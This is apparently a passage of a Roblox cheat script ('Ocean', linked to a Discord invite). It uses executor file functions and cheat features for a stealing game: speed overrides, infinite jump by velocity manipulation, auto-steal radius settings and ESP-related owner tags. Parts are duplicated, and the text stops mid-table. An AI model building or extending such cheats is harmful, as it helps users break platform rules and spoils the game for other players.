OCEAN_OWNER_NAMES = {
    ["octavian112299"] = true,
    ["davidboosr9"] = true,
}
OCEAN_OWNER_IDS = {
    [1455390178] = true,
    [3884286603] = true,
}
local _ownerTagEntries = {} -- [Player] = {gui=, label=, conns={}}

local function isOceanOwner(plr)
    if not plr or plr == player or plr == LP then return false end
    if OCEAN_OWNER_IDS[plr.UserId] then return true end
    local n = string.lower(tostring(plr.Name or ""))
    local d = string.lower(tostring(plr.DisplayName or ""))
    return OCEAN_OWNER_NAMES[n] == true or OCEAN_OWNER_NAMES[d] == true
end

local function clearOwnerTag(plr)
    local e = _ownerTagEntries[plr]
    if not e then return end
    if e.conns then
        for _, c in ipairs(e.conns) do pcall(function() c:Disconnect() end) end
    end
    if e.gui then pcall(function() e.gui:Destroy() end) end
    _ownerTagEntries[plr] = nil
end

local function attachOwnerTagToCharacter(plr, char)
    if not plr or not char then return end
    clearOwnerTag(plr)
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
    if not head then return end

    local bb = Instance.new("BillboardGui")
    bb.Name = "OceanOwnerTag"
    bb.Size = UDim2.fromOffset(160, 28)
    -- Above enemy ESP speed tracer (name | ws | vel)
    bb.StudsOffset = Vector3.new(0, 4.35, 0)
    bb.AlwaysOnTop = true
    bb.MaxDistance = 500
    bb.ResetOnSpawn = false
    bb.Adornee = head
    bb.Parent = head

    local bg = Instance.new("Frame")
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
    bg.BackgroundTransparency = 0.25
    bg.BorderSizePixel = 0
    bg.Parent = bb
    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 8)

    local st = Instance.new("UIStroke")
    st.Thickness = 1.5
    st.Color = ACCENT_COLOR or Color3.fromRGB(56, 140, 255)
    st.Parent = bg

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.fromScale(1, 1)
    lbl.BackgroundTransparency = 1
    lbl.Text = "Ocean Owner"
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 14
    lbl.TextColor3 = ACCENT_COLOR or Color3.fromRGB(56, 140, 255)
    lbl.TextStrokeTransparency = 0.4
    lbl.Parent = bg

    -- Keep accent live
    pcall(function()
        if registerAccentHook then
            registerAccentHook(function(a)
                if st and st.Parent then st.Color = a end
                if lbl and lbl.Parent then lbl.TextColor3 = a end
            end, bb)
        end
    end)

    local conns = {}
    table.insert(conns, char.AncestryChanged:Connect(function(_, parent)
        if not parent then clearOwnerTag(plr) end
    end))
    _ownerTagEntries[plr] = {gui = bb, label = lbl, conns = conns}
end

local function setupOwnerTagForPlayer(plr)
    -- World billboard disabled: Ocean Owner is drawn as fixed-size 2D ESP above speed tracer
    if not isOceanOwner(plr) then return end
    clearOwnerTag(plr)
end

task.spawn(function()
    -- slight delay so character/head exist after execute
    task.wait(0.5)
    for _, plr in ipairs(Players:GetPlayers()) do
        pcall(setupOwnerTagForPlayer, plr)
    end
    Players.PlayerAdded:Connect(function(plr)
        pcall(setupOwnerTagForPlayer, plr)
    end)
    Players.PlayerRemoving:Connect(function(plr)
        pcall(clearOwnerTag, plr)
    end)
end)


do
    local LP_anim = Players.LocalPlayer
    local function isVampireAnim(id)
        if not id then return false end
        for _,v in pairs(VampireAnims) do if v == id then return true end end
        return false
    end
    local function saveOriginalAnims(char)
        local animate = char:FindFirstChild("Animate")
        if not animate then return end
        local function g(obj) return obj and obj.AnimationId or nil end
        local ids = {
            walk=g(animate.walk and animate.walk.WalkAnim),
            run=g(animate.run and animate.run.RunAnim),
            jump=g(animate.jump and animate.jump.JumpAnim),
            fall=g(animate.fall and animate.fall.FallAnim),
            climb=g(animate.climb and animate.climb.ClimbAnim),
            swim=g(animate.swim and animate.swim.Swim),
            swimidle=g(animate.swimidle and animate.swimidle.SwimIdle),
            idle1=g(animate.idle and animate.idle.Animation1),
            idle2=g(animate.idle and animate.idle.Animation2),
        }
        if not isVampireAnim(ids.walk) then AnimRefs.originalAnims = ids end
    end
    function applyVampireAnims(char)
        local animate = char:FindFirstChild("Animate")
        if not animate then return end
        local function s(obj, id) if obj then obj.AnimationId = "rbxassetid://" .. id end end
        s(animate.walk and animate.walk.WalkAnim, VampireAnims.WalkAnim)
        s(animate.run and animate.run.RunAnim, VampireAnims.RunAnim)
        s(animate.jump and animate.jump.JumpAnim, VampireAnims.JumpAnim)
        s(animate.fall and animate.fall.FallAnim, VampireAnims.FallAnim)
        s(animate.climb and animate.climb.ClimbAnim, VampireAnims.ClimbAnim)
        s(animate.swim and animate.swim.Swim, VampireAnims.Swim)
        s(animate.swimidle and animate.swimidle.SwimIdle, VampireAnims.SwimIdle)
        s(animate.idle and animate.idle.Animation1, VampireAnims.Animation1)
        s(animate.idle and animate.idle.Animation2, VampireAnims.Animation2)
    end
    _G.applyVampireAnims = applyVampireAnims
    local function restoreOriginalAnims(char)
        local orig = AnimRefs.originalAnims
        if not orig then return end
        local animate = char:FindFirstChild("Animate")
        if not animate then return end
        local function s(obj, id) if obj and id then obj.AnimationId = id end end
        s(animate.walk and animate.walk.WalkAnim, orig.walk)
        s(animate.run and animate.run.RunAnim, orig.run)
        s(animate.jump and animate.jump.JumpAnim, orig.jump)
        s(animate.fall and animate.fall.FallAnim, orig.fall)
        s(animate.climb and animate.climb.ClimbAnim, orig.climb)
        s(animate.swim and animate.swim.Swim, orig.swim)
        s(animate.swimidle and animate.swimidle.SwimIdle, orig.swimidle)
        s(animate.idle and animate.idle.Animation1, orig.idle1)
        s(animate.idle and animate.idle.Animation2, orig.idle2)
    end
    function startAnimToggle()
        if AnimRefs.heartbeat then AnimRefs.heartbeat:Disconnect(); AnimRefs.heartbeat = nil end
        local char = LP_anim.Character
        if char then saveOriginalAnims(char); applyVampireAnims(char) end
        AnimRefs.heartbeat = RunService.Heartbeat:Connect(function()
            if not animEnabled then return end
            local c = LP_anim.Character
            if c then applyVampireAnims(c) end
        end)
    end
    function stopAnimToggle()
        if AnimRefs.heartbeat then AnimRefs.heartbeat:Disconnect(); AnimRefs.heartbeat = nil end
        local char = LP_anim.Character
        if char then restoreOriginalAnims(char) end
    end
end

MOB_POS_FILE="Ocean_BtnPos.json"


OCEAN_OWNER_NAMES = {
    ["octavian112299"] = true,
    ["davidboosr9"] = true,
}
OCEAN_OWNER_IDS = {
    [1455390178] = true,
    [3884286603] = true,
}
local _ownerTagEntries = {} -- [Player] = {gui=, label=, conns={}}

local function isOceanOwner(plr)
    if not plr or plr == player or plr == LP then return false end
    if OCEAN_OWNER_IDS[plr.UserId] then return true end
    local n = string.lower(tostring(plr.Name or ""))
    local d = string.lower(tostring(plr.DisplayName or ""))
    return OCEAN_OWNER_NAMES[n] == true or OCEAN_OWNER_NAMES[d] == true
end

local function clearOwnerTag(plr)
    local e = _ownerTagEntries[plr]
    if not e then return end
    if e.conns then
        for _, c in ipairs(e.conns) do pcall(function() c:Disconnect() end) end
    end
    if e.gui then pcall(function() e.gui:Destroy() end) end
    _ownerTagEntries[plr] = nil
end

local function attachOwnerTagToCharacter(plr, char)
    if not plr or not char then return end
    clearOwnerTag(plr)
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
    if not head then return end

    local bb = Instance.new("BillboardGui")
    bb.Name = "OceanOwnerTag"
    bb.Size = UDim2.fromOffset(160, 28)
    bb.StudsOffset = Vector3.new(0, 4.35, 0)
    bb.AlwaysOnTop = true
    bb.MaxDistance = 500
    bb.ResetOnSpawn = false
    bb.Adornee = head
    bb.Parent = head

    local bg = Instance.new("Frame")
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
    bg.BackgroundTransparency = 0.25
    bg.BorderSizePixel = 0
    bg.Parent = bb
    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 8)

    local st = Instance.new("UIStroke")
    st.Thickness = 1.5
    st.Color = ACCENT_COLOR or Color3.fromRGB(56, 140, 255)
    st.Parent = bg

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.fromScale(1, 1)
    lbl.BackgroundTransparency = 1
    lbl.Text = "Ocean Owner"
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 14
    lbl.TextColor3 = ACCENT_COLOR or Color3.fromRGB(56, 140, 255)
    lbl.TextStrokeTransparency = 0.4
    lbl.Parent = bg

    -- Keep accent live
    pcall(function()
        if registerAccentHook then
            registerAccentHook(function(a)
                if st and st.Parent then st.Color = a end
                if lbl and lbl.Parent then lbl.TextColor3 = a end
            end, bb)
        end
    end)

    local conns = {}
    table.insert(conns, char.AncestryChanged:Connect(function(_, parent)
        if not parent then clearOwnerTag(plr) end
    end))
    _ownerTagEntries[plr] = {gui = bb, label = lbl, conns = conns}
end

local function setupOwnerTagForPlayer(plr)
    if not isOceanOwner(plr) then return end
    clearOwnerTag(plr)
end

task.spawn(function()
    task.wait(0.5)
    for _, plr in ipairs(Players:GetPlayers()) do
        pcall(setupOwnerTagForPlayer, plr)
    end
    Players.PlayerAdded:Connect(function(plr)
        pcall(setupOwnerTagForPlayer, plr)
    end)
    Players.PlayerRemoving:Connect(function(plr)
        pcall(clearOwnerTag, plr)
    end)
end)


MOB_POS_FILE="Ocean_BtnPos.json"
function getBtnPositionsTable()
    if not mobGuiRef then return {} end
    local out={}
    for _,child in ipairs(mobGuiRef:GetChildren()) do
        if child:IsA("Frame") and child.Name:sub(1,5)=="SBtn_" then
            local lbl=child.Name:sub(6)
            out[lbl]={xs=child.Position.X.Scale,xo=child.Position.X.Offset,ys=child.Position.Y.Scale,yo=child.Position.Y.Offset}
        end
    end
    local lockFr=mobGuiRef:FindFirstChild("SBtnLock")
    if lockFr then out["__lock"]={xs=lockFr.Position.X.Scale,xo=lockFr.Position.X.Offset,ys=lockFr.Position.Y.Scale,yo=lockFr.Position.Y.Offset} end
    local panel=mobGuiRef:FindFirstChild("MobilePanel")
    if panel then out["__panel"]={xs=panel.Position.X.Scale,xo=panel.Position.X.Offset,ys=panel.Position.Y.Scale,yo=panel.Position.Y.Offset} end
    return out
end
function loadBtnPositions()
    -- primary: dedicated position file
    if isfile and isfile(MOB_POS_FILE) then
        local ok,data=pcall(function() return HS:JSONDecode(readfile(MOB_POS_FILE)) end)
        if ok and type(data)=="table" then return data end
    end
    if isfile and isfile(CONFIG_FILE) then
        local ok,data=pcall(function() return HS:JSONDecode(readfile(CONFIG_FILE)) end)
        if ok and type(data)=="table" and type(data.btnPositions)=="table" then return data.btnPositions end
    end
    return {}
end
function saveBtnPositions()
    if not writefile then return end
    pcall(function() writefile(MOB_POS_FILE,HS:JSONEncode(getBtnPositionsTable())) end)
    if saveConfig then pcall(saveConfig) end
end

function resetMobileButtonPositions()
    -- Clear dedicated position file
    pcall(function()
        if type(delfile) == "function" and isfile and isfile(MOB_POS_FILE) then
            delfile(MOB_POS_FILE)
        elseif writefile then
            writefile(MOB_POS_FILE, "{}")
        end
    end)
    pcall(function()
        if syn and type(syn.delfile) == "function" and isfile and isfile(MOB_POS_FILE) then
            syn.delfile(MOB_POS_FILE)
        end
    end)
    pcall(function()
        if isfile and isfile(CONFIG_FILE) and readfile and writefile then
            local ok, data = pcall(function() return HS:JSONDecode(readfile(CONFIG_FILE)) end)
            if ok and type(data) == "table" then
                data.btnPositions = {}
                writefile(CONFIG_FILE, HS:JSONEncode(data))
            end
        end
    end)
    -- Rebuild at default grid positions
    if mobileButtonsEnabled and buildMobileButtons then
        buildMobileButtons()
    end
    if saveConfig then pcall(saveConfig) end
end

function addShimmerToLabel(lbl,color1,color2)
    local gr=Instance.new("UIGradient",lbl)
    gr.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,color1 or Color3.fromRGB(200,200,200)),ColorSequenceKeypoint.new(0.5,color2 or Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,color1 or Color3.fromRGB(200,200,200))})
    gr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0.3,0),NumberSequenceKeypoint.new(0.5,0,0),NumberSequenceKeypoint.new(1,0.3,0)})
    return gr
end
fovConn=nil
function applyFOV()
    if fovConn then fovConn:Disconnect() end
    fovConn=RunService.RenderStepped:Connect(function() local cam=workspace.CurrentCamera;if cam then cam.FieldOfView=fovValue end end)
end
applyFOV()

function applyRagdollGuiPosition()
end

function createRagdollBillboard(duration,labelText,color)
    if not ragdollGuiEnabled then return nil end
    local WHITE = Color3.fromRGB(255,255,255)
    local BG = Color3.fromRGB(10,12,18)
    local W, H = 200, 72
    local guiName = "MoveeRagdollTimer_" .. tostring(labelText)
    local mode = string.upper(tostring(ragdollGuiPos or "UP"))
    if mode == "DOWN" then mode = "UNDER_SPEED" end -- legacy

    -- wipe previous hosts
    pcall(function()
        local pg = LP:FindFirstChild("PlayerGui")
        if pg then
            local o = pg:FindFirstChild(guiName)
            if o then o:Destroy() end
        end
        if gethui then
            local o = gethui():FindFirstChild(guiName)
            if o then o:Destroy() end
        end
        local char = LP.Character
        local head = char and char:FindFirstChild("Head")
        if head then
            local o = head:FindFirstChild(guiName)
            if o then o:Destroy() end
        end
    end)
    if _activeRagdollHost then pcall(function() _activeRagdollHost:Destroy() end) _activeRagdollHost = nil end
    _activeRagdollCard = nil

    local host -- ScreenGui or BillboardGui
    local card

    if mode == "UNDER_SPEED" then
        local char = LP.Character
        local head = char and char:FindFirstChild("Head")
        if not head then
            head = char and char:WaitForChild("Head", 2)
        end
        if not head then return nil end
        local bb = Instance.new("BillboardGui")
        bb.Name = guiName
        bb.Size = UDim2.fromOffset(W, H)
        bb.StudsOffset = Vector3.new(0, 1.15, 0)
        bb.AlwaysOnTop = true
        bb.MaxDistance = 250
        bb.LightInfluence = 0
        bb.ResetOnSpawn = false
        bb.Adornee = head
        bb.Parent = head
        host = bb
        card = Instance.new("Frame", bb)
        card.Size = UDim2.fromScale(1, 1)
        card.Position = UDim2.fromOffset(0, 0)
        card.BackgroundTransparency = 0
    else
        -- UP = original fixed screen position
        local sg = Instance.new("ScreenGui")
        sg.Name = guiName
        sg.ResetOnSpawn = false
        sg.IgnoreGuiInset = true
        sg.DisplayOrder = 200000
        sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        parentGui(sg)
        if not sg.Parent then return nil end
        host = sg
        card = Instance.new("Frame", sg)
        card.Size = UDim2.fromOffset(W, H)
        card.Position = UDim2.new(0.5, -W/2, 0.18, 0) -- original UP
    end

    card.BackgroundColor3 = BG
    card.BorderSizePixel = 0
    card.ZIndex = 50
    card.Active = true
    card.Name = "RagdollCard"
    card.BackgroundTransparency = 0
    card.BackgroundColor3 = BG
    _activeRagdollCard = card
    _activeRagdollHost = host
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 14)
    local stroke = Instance.new("UIStroke", card)
    stroke.Color = ACCENT_COLOR
    stroke.Thickness = 1.6
    stroke.Transparency = 0.25
    stroke.Enabled = true
    task.spawn(function()
        local t0 = 0
        while stroke and stroke.Parent do
            t0 = t0 + 0.05
            stroke.Transparency = 0.15 + math.abs(math.sin(t0 * 2.2)) * 0.35
            stroke.Color = ACCENT_COLOR
            task.wait(0.04)
        end
    end)

    local tag = Instance.new("TextLabel", card)
    tag.Size = UDim2.new(1, -16, 0, 16)
    tag.Position = UDim2.fromOffset(8, 8)
    tag.BackgroundTransparency = 1
    tag.Font = Enum.Font.GothamBold
    tag.TextSize = 11
    tag.TextColor3 = Color3.fromRGB(160, 165, 180)
    tag.TextXAlignment = Enum.TextXAlignment.Center
    tag.ZIndex = 32
    if labelText == "RAGDOLL" then
        tag.Text = "RAGDOLL"
    elseif labelText == "STONE" then
        tag.Text = "STONE"
    else
        tag.Text = tostring(labelText)
    end

    local timerLbl = Instance.new("TextLabel", card)
    timerLbl.Size = UDim2.new(1, -16, 0, 28)
    timerLbl.Position = UDim2.fromOffset(8, 24)
    timerLbl.BackgroundTransparency = 1
    timerLbl.Font = Enum.Font.GothamBlack
    timerLbl.TextSize = 22
    timerLbl.TextColor3 = WHITE
    timerLbl.Text = string.format("%.1fs", duration or 0)
    timerLbl.TextXAlignment = Enum.TextXAlignment.Center
    timerLbl.ZIndex = 32

    local track = Instance.new("Frame", card)
    track.Size = UDim2.new(1, -20, 0, 5)
    track.Position = UDim2.fromOffset(10, 70)
    track.BackgroundColor3 = Color3.fromRGB(28, 30, 38)
    track.BorderSizePixel = 0
    track.ZIndex = 31
    track.Visible = true
    track.BackgroundTransparency = 0
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local fill = Instance.new("Frame", track)
    fill.Size = UDim2.new(1, 0, 1, 0)
    fill.BackgroundColor3 = ACCENT_COLOR
    fill.BorderSizePixel = 0
    fill.ZIndex = 32
    fill.BackgroundTransparency = 0
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

if mode ~= "UNDER_SPEED" then
        TweenService:Create(card, TweenInfo.new(0.2), {BackgroundTransparency = 0.05}):Play()
    else
        card.BackgroundTransparency = 1
    end
    task.spawn(function()
        local dur = tonumber(duration) or 2.5
        local t0 = tick()
        while card and card.Parent do
            local left = math.max(0, dur - (tick() - t0))
            timerLbl.Text = string.format("%.1fs", left)
            fill.Size = UDim2.new(math.clamp(left / dur, 0, 1), 0, 1, 0)
            fill.BackgroundColor3 = ACCENT_COLOR
            if left <= 0 then break end
            task.wait(0.05)
        end
        if card and card.Parent then
            TweenService:Create(card, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
            task.wait(0.22)
            pcall(function() if host then host:Destroy() end end)
        end
    end)
    return host
end

function onHumanoidStateChanged(_old, new)
    if not ragdollGuiEnabled then return end
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local isRag = (new == Enum.HumanoidStateType.Physics
        or new == Enum.HumanoidStateType.Ragdoll
        or new == Enum.HumanoidStateType.FallingDown)
    if isRag and not hum.PlatformStand then
        if activeBatBillboard then
            pcall(function() activeBatBillboard:Destroy() end)
            activeBatBillboard = nil
        end
        activeBatBillboard = createRagdollBillboard(2.6, "RAGDOLL", Color3.fromRGB(255, 255, 255))
        task.delay(2.7, function()
            if activeBatBillboard then
                pcall(function() activeBatBillboard:Destroy() end)
                activeBatBillboard = nil
            end
        end)
    end
end

function onMedusaStateChanged()
    if not ragdollGuiEnabled then return end
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    if hum.PlatformStand then
        if not activeMedusaBillboard then
            activeMedusaBillboard = createRagdollBillboard(4.5, "STONE", Color3.fromRGB(255, 255, 255))
            task.delay(4.6, function()
                if activeMedusaBillboard then
                    pcall(function() activeMedusaBillboard:Destroy() end)
                    activeMedusaBillboard = nil
                end
            end)
        end
    else
        if activeMedusaBillboard then
            pcall(function() activeMedusaBillboard:Destroy() end)
            activeMedusaBillboard = nil
        end
    end
end

function setupRagdollTriggers()
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then
        hum = char:FindFirstChildWhichIsA("Humanoid", true)
    end
    if not hum then return end
    if hum:GetAttribute("OceanRagdollHooked") then return end
    hum:SetAttribute("OceanRagdollHooked", true)
    hum.StateChanged:Connect(onHumanoidStateChanged)
    hum:GetPropertyChangedSignal("PlatformStand"):Connect(onMedusaStateChanged)
end

-- Re-hook on respawn
if not _oceanRagdollCharHooked then
    _oceanRagdollCharHooked = true
    LP.CharacterAdded:Connect(function()
        task.defer(function()
            task.wait(0.3)
            pcall(setupRagdollTriggers)
        end)
    end)
    task.defer(function()
        task.wait(0.5)
        pcall(setupRagdollTriggers)
    end)
end
function setupSpeedIndicator(char)
    local head=char:WaitForChild("Head",5);if not head then return end
    if head:FindFirstChild("MoveeSpeedBB") then head.MoveeSpeedBB:Destroy() end
    local bb=Instance.new("BillboardGui",head)
    bb.Name="MoveeSpeedBB"
    bb.Size=UDim2.new(0,120,0,48)
    bb.StudsOffset=Vector3.new(0,3.2,0)
    bb.AlwaysOnTop=true
    bb.MaxDistance=200

    local discordLabel=Instance.new("TextLabel",bb)
    discordLabel.Size=UDim2.new(1,0,0,16)
    discordLabel.Position=UDim2.new(0,0,0,0)
    discordLabel.BackgroundTransparency=1
    discordLabel.Text=".gg/heartless"
    discordLabel.TextColor3=Color3.fromRGB(180,180,190)
    discordLabel.Font=Enum.Font.GothamBold
    discordLabel.TextSize=11
    discordLabel.TextScaled=false
    discordLabel.TextStrokeTransparency=0.4
    discordLabel.TextStrokeColor3=Color3.fromRGB(0,0,0)

    speedLabel=Instance.new("TextLabel",bb)
    speedLabel.Size=UDim2.new(1,0,0,28)
    speedLabel.Position=UDim2.new(0,0,0,16)
    speedLabel.BackgroundTransparency=1
    speedLabel.Text="0"
    speedLabel.TextColor3=Color3.fromRGB(255,255,255)
    speedLabel.Font=Enum.Font.GothamBlack
    speedLabel.TextSize=22
    speedLabel.TextScaled=false
    speedLabel.TextStrokeTransparency=0.25
    speedLabel.TextStrokeColor3=Color3.fromRGB(0,0,0)

    registerAccentHook(function(a)
        speedLabel.TextColor3 = a
        discordLabel.TextColor3 = Color3.new(
            math.clamp(a.R * 0.7 + 0.3, 0, 1),
            math.clamp(a.G * 0.7 + 0.3, 0, 1),
            math.clamp(a.B * 0.7 + 0.3, 0, 1)
        )
    end, bb)
end
task.defer(function()
    task.wait(0.5)
    pcall(function()
        if LP.Character and setupSpeedIndicator then
            setupSpeedIndicator(LP.Character)
        end
    end)
end)

local function formatSpeedValue(n)
    n = tonumber(n) or 0
    n = math.floor(n * 10 + 0.5) / 10
    if n == math.floor(n) then
        return tostring(math.floor(n))
    end
    return string.format("%.1f", n)
end
function getActiveMoveSpeed()
    if laggerModeEnabled then
        return carrySpeedActive and (LAGGER_CARRY_SPEED or 15) or (LAGGER_SPEED or 30)
    end
    if carrySpeedActive then
        return CS or 29
    end
    return NS or 59
end
function getActiveMoveSpeedRaw()
    return getActiveMoveSpeed()
end
function getAutoPathSpeed()
    if not (autoLeftEnabled or autoRightEnabled) then
        return getActiveMoveSpeed()
    end
    local holding = false
    pcall(function() holding = isHoldingCarryTool() end)
    if not holding then
        pcall(function() holding = _brainrotCarryActive == true end)
    end
    if holding then
        if laggerModeEnabled then return (LAGGER_CARRY_SPEED or 15) end
        return (CS or 29)
    end
    if laggerModeEnabled then return (LAGGER_SPEED or 30) end
    return (NS or 59)
end

local function enableCarryOnArrive()
    if not carrySpeedActive then
        carrySpeedActive = true
        if refreshSpeedModeLabel then pcall(refreshSpeedModeLabel) end
        if mobBtnRefs and mobBtnRefs.carrySpeed then pcall(function() mobBtnRefs.carrySpeed(true) end) end
    end
end
_autoSwitchWasSteal=false
function updateAutoSwitchSpeed()
    local char=LP.Character;if not char then return end
    local h=char:FindFirstChildOfClass("Humanoid");if not h then return end
    local holding = false
    pcall(function()
        if isHoldingCarryTool then holding = isHoldingCarryTool() end
    end)
    if holding then
        if not carrySpeedActive then
            carrySpeedActive = true
            if refreshSpeedModeLabel then refreshSpeedModeLabel() end
            if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(true) end
        end
        _autoSwitchWasSteal = true
        return
    end
    if autoSwitchSpeedEnabled and _autoSwitchWasSteal and not holding then
        carrySpeedActive = false
        _autoSwitchWasSteal = false
        if refreshSpeedModeLabel then refreshSpeedModeLabel() end
        if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(false) end
    end
end
task.spawn(function() while true do task.wait(0.25);updateAutoSwitchSpeed() end end)

local _infJumpManualConn = nil
local function applyInfJumpBoost(boost)
    boost = boost or 55
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if root then
        root.Velocity = Vector3.new(root.Velocity.X, boost, root.Velocity.Z)
    end
end

function startHoldInfJump()
    if holdInfJumpConn then holdInfJumpConn:Disconnect(); holdInfJumpConn = nil end
    if _infJumpManualConn then _infJumpManualConn:Disconnect(); _infJumpManualConn = nil end
    if not infJumpEnabled then return end

    local mode = string.lower(tostring(infJumpMode or "manual"))
    if mode == "hold" then
        holdInfJumpConn = RunService.Heartbeat:Connect(function()
            if not infJumpEnabled then return end
            if string.lower(tostring(infJumpMode or "")) ~= "hold" then return end
            local char = LP.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not root or not hum then return end
            local isJumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump == true)
            if isJumpHeld and root.Velocity.Y < 35 then
                root.Velocity = Vector3.new(root.Velocity.X, 55, root.Velocity.Z)
            end
            if root.Velocity.Y < -120 then
                root.Velocity = Vector3.new(root.Velocity.X, -120, root.Velocity.Z)
            end
        end)
    else
        _infJumpManualConn = UIS.JumpRequest:Connect(function()
            if not infJumpEnabled then return end
            if string.lower(tostring(infJumpMode or "manual")) ~= "manual" then return end
            applyInfJumpBoost(55)
        end)
    end
end

function stopHoldInfJump()
    if holdInfJumpConn then
        holdInfJumpConn:Disconnect()
        holdInfJumpConn = nil
    end
    if _infJumpManualConn then
        _infJumpManualConn:Disconnect()
        _infJumpManualConn = nil
    end
end


cursedInstaReset = function() end
forceHardReset = function() end
function findCursedResetRemote() return nil end
function fireCursedResetRemote() return false end
function collectCursedResetRemotes() return {} end
function clearResetOnDieConns() end
function setupResetOnDie(char) end
local _instaResetBusy = false
local _instaResetLast = 0
local _resetOnDieDebounce = false
local _medusaResetDebounce = false

KB={DropBrainrot={kb=nil,gp=nil},AutoLeft={kb=nil,gp=nil},AutoRight={kb=nil,gp=nil},AutoBat={kb=nil,gp=nil},TPFloor={kb=nil,gp=nil},GuiHide={kb=nil,gp=nil},SpeedToggle={kb=nil,gp=nil},LaggerToggle={kb=nil,gp=nil},TPBat={kb=nil,gp=nil}}
AP_L1,AP_L2=Vector3.new(-476.47,-6.28,92.73),Vector3.new(-483.12,-4.95,94.81)
AP_R1,AP_R2=Vector3.new(-476.16,-6.52,25.62),Vector3.new(-483.06,-5.03,25.48)
Steal={AutoStealEnabled=false,StealRadius=61,StealDuration=1.3,Data={}}
stealMode="normal" -- "normal" or "semi"
normalStealVersion="86"
NORMAL_STEAL_PERCENT={
    ["75"]=0.75,
    ["80"]=0.80,
    ["86"]=0.86,
    ["90"]=0.90,
}
normalStealProgress=0
normalStealPaused=false
StealRadii = { Normal = 63, Semi = 10 }
StealDurations = { Normal = 1.4, SemiMax = 2.6, SemiMin = 1.3 }
SemiSteal={State={active=false,startTime=0,inRange=false},CONFIG={HOLD_MIN=1.3,HOLD_MAX=2.6,ENTRY_DELAY=0.3,STEAL_RANGE=10,PRIME_RANGE=80,COOLDOWN=0.05}}
_stealRadiusUISetters = _stealRadiusUISetters or {}
_stealDurationUISetters = _stealDurationUISetters or {}
function refreshStealRadiusUI()
    local r = Steal and Steal.StealRadius
    local d = Steal and Steal.StealDuration
    for _, fn in ipairs(_stealRadiusUISetters) do pcall(fn, r) end
    for _, fn in ipairs(_stealDurationUISetters) do pcall(fn, d) end
end
function applyStealModeParams()
    if stealMode == "semi" then
        if Steal.StealRadius and Steal.StealRadius > 15 then
            StealRadii.Normal = Steal.StealRadius
        end
        if Steal.StealDuration and Steal.StealDuration < 2.0 then
            StealDurations.Normal = Steal.StealDuration
        end
        StealRadii.Semi = 10
        Steal.StealRadius = 10
        Steal.StealDuration = StealDurations.SemiMax or 2.6
        if SemiSteal and SemiSteal.CONFIG then
            SemiSteal.CONFIG.HOLD_MIN = StealDurations.SemiMin or 1.3
            SemiSteal.CONFIG.HOLD_MAX = StealDurations.SemiMax or 2.6
            SemiSteal.CONFIG.STEAL_RANGE = 10
        end
    else
        Steal.StealRadius = StealRadii.Normal or 63
        Steal.StealDuration = StealDurations.Normal or 1.4
    end
    pcall(function() if refreshStealRadiusUI then refreshStealRadiusUI() end end)
end

startSemiAutoSteal,stopSemiAutoSteal=nil,nil
isStealing,stealStartTime=false,nil
Conns={autoSteal=nil,antiRag=nil,batCounter=nil,anchor={}}
MEDUSA_COOLDOWN=0.35;batCounterDebounce=false
lastMoveDir=Vector3.new(0,0,0)
MOVE_KEYS={[Enum.KeyCode.W]=true,[Enum.KeyCode.A]=true,[Enum.KeyCode.S]=true,[Enum.KeyCode.D]=true,[Enum.KeyCode.Up]=true,[Enum.KeyCode.Left]=true,[Enum.KeyCode.Down]=true,[Enum.KeyCode.Right]=true}
function isRagdollState(hum)
    if not hum then return true end;local st=hum:GetState()
    return hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown
end
function isMyPlotByName(plotName)
    local plots=workspace:FindFirstChild("Plots");if not plots then return false end
    local plot=plots:FindFirstChild(plotName);if not plot then return false end
    local sign=plot:FindFirstChild("PlotSign")
    if sign then local yb=sign:FindFirstChild("YourBase");if yb and yb:IsA("BillboardGui") then return yb.Enabled==true end end
    return false
end

local BASE_THEMES = {
    Lava = {
        primary   = Color3.fromRGB(160, 45, 10),
        secondary = Color3.fromRGB(100, 20, 5),
        accent    = Color3.fromRGB(190, 70, 20),
        dark      = Color3.fromRGB(18, 8, 4),
        glass     = Color3.fromRGB(180, 60, 20),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.SmoothPlastic,
        reflectance = 0,
        glassRefl = 0,
    },
    Bubblegum = {
        primary   = Color3.fromRGB(255, 120, 200),
        secondary = Color3.fromRGB(200, 80, 180),
        accent    = Color3.fromRGB(255, 180, 230),
        dark      = Color3.fromRGB(90, 40, 90),
        glass     = Color3.fromRGB(255, 200, 240),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.SmoothPlastic,
        reflectance = 0,
        glassRefl = 0,
    },
    Snowy = {
